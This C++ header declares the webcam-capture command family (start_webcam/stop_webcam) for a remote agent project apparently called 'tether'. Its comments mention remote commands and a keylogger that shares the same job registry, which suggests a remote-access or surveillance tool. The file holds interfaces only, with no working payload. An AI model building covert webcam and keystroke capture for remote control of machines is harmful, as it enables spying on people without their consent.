// lib/syscalls/camera.hpp - the camera family interface (design D6, task
// 6.6). Two verbs: start_webcam / stop_webcam, running as a managed
// background job in the SHARED registry (jobs.hpp, slot "camera") per the
// remote-commands delta's job lifecycle:
//
//  start_webcam  seats the capture worker on its own thread; a duplicate
//                start (slot occupied) is refused with the structured
//                "already_running" result and the incumbent is untouched.
//  stop_webcam   signals + joins the job and delivers the accumulated
//                file result (the latest published frame as a complete,
//                decodable PNG); a stop with nothing running refuses with
//                "not_running"; a worker whose source died surfaces as
//                "execute_failed". A worker failure never wedges the slot.
//
// The production frame source is cv::VideoCapture (opencv4 videoio); the
// source seam IS injectable (IFrameSource) so tests run entirely on fakes -
// CI runners have no cameras and no test ever requires a physical device.
#pragma once

#include "errors.hpp"
#include "image_png.hpp" // Frame
#include "jobs.hpp"
#include "matrix.hpp" // Outcome::Deliverable (the file-result shape)

#include <functional>
#include <memory>

namespace tether::syscalls {

// The camera-device seam: production binds cv::VideoCapture, tests bind
// fakes with generated frames (task 6.6: no requirement for a webcam).
class IFrameSource {
public:
    virtual ~IFrameSource() = default;

    // Acquires the device; false when unavailable (no device, busy, denied).
    virtual bool open() = 0;

    // Grabs the next frame into `out`. False when the source stops giving
    // frames (device gone / disconnected).
    virtual bool read(Frame& out) = 0;

    virtual void close() = 0;
};

class ICameraCapture {
public:
    virtual ~ICameraCapture() = default;

    // Starts the background capture job. Occupied slot throws
    // "already_running" (the running job is untouched); a worker that later
    // fails surfaces through stop_job().
    virtual void start_job() = 0;

    // Stops the running job (signal + join) and returns its accumulated
    // deliverable. Nothing running throws "not_running"; a worker failure
    // (source refused to open / stopped delivering) throws "execute_failed".
    virtual Outcome::Deliverable stop_job() = 0;
};

// The concrete implementation over the shared registry + injected source
// factory + pacing waiter (all three injectable: the agent main gets the
// production default, tests bind fakes and a tiny waiter).
class VideoCameraCapture : public ICameraCapture {
public:
    using SourceFactory = std::function<std::shared_ptr<IFrameSource>()>;

    // `waiter` paces the worker between frames (production: real interval
    // sleep; tests: micro/nop). `registry` is the SHARED job registry the
    // 6.7 keylogger plugs into with its own slot.
    VideoCameraCapture(SourceFactory factory, std::shared_ptr<BackgroundJobRegistry> registry,
                       std::function<void()> waiter)
        : factory_(std::move(factory)), registry_(std::move(registry)),
          waiter_(std::move(waiter)) {}

    void start_job() override;
    Outcome::Deliverable stop_job() override;

private:
    SourceFactory factory_;
    std::shared_ptr<BackgroundJobRegistry> registry_;
    std::function<void()> waiter_;
};

// Builds the production implementation: cv::VideoCapture(device 0), the
// shared registry instance for the agent process, and the real frame
// interval pacing. On a host without a camera, start succeeds and the
// failure surfaces through stop/job state as a structured result the
// dispatcher classifies (never an unclassified outcome).
std::shared_ptr<ICameraCapture> make_camera_capture();

// Builds the production implementation over an INJECTED registry (the agent
// main wires ONE shared registry across families; tests inject their own).
std::shared_ptr<ICameraCapture> make_camera_capture_with_registry(
    std::shared_ptr<BackgroundJobRegistry> registry);

// The production source factory: cv::VideoCapture on `device_index`.
std::shared_ptr<IFrameSource> make_video_capture_source(int device_index);

} // namespace tether::syscalls
